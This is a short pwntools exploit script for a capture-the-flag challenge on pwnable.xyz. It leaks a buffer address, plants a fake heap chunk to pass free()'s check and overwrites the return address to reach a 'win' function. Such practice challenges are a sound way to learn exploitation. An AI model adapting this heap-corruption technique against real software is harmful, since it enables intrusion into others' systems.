from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30005)
elf = ELF('./challenge')

p.sendafter('> ', '2')
buf = int(p.recvline().strip(), 16)
success('buf = 0x%x', buf)

p.sendafter('> ', '1')
p.send(b'a'*8 + p64(buf+88-0x10))

p.sendafter('> ', '3')

p.sendafter('> ', '1')
p.send(p64(0x31)+p64(buf)+p64(elf.sym['win']))  # create fake chunk to pass the check of free and hijack return address to win

p.sendafter('> ', '3')
p.sendafter('> ', '0')

p.interactive()
